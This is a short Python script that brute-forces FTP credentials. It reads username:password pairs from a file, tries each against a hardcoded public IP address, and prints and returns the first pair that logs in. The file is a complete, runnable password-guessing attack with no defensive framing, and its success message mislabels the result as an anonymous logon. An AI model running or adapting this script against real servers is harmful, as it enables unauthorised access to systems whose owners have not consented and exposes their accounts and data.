# coding=UTF-8
import ftplib
def bruteLogin(hostname, passwdFile):
    pF = open(passwdFile, 'r')
    for line in pF.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName,passWord)
            print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded:' + userName +'/' + passWord)
            ftp.quit()
            return (userName,passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)

host = '123.56.99.154'
passwdFile = 'userpass.txt'
bruteLogin(host, passwdFile)

